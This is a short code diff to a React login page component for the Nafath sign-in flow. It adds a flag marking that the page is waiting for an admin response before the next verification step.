@@ -100,6 +100,7 @@ export default function NafathLoginPage() {
       },
       current: "تسجيل دخول نفاذ",
       nextPage: "تحقق نفاذ",
+      waitingForAdminResponse: true,
     });
   };
 
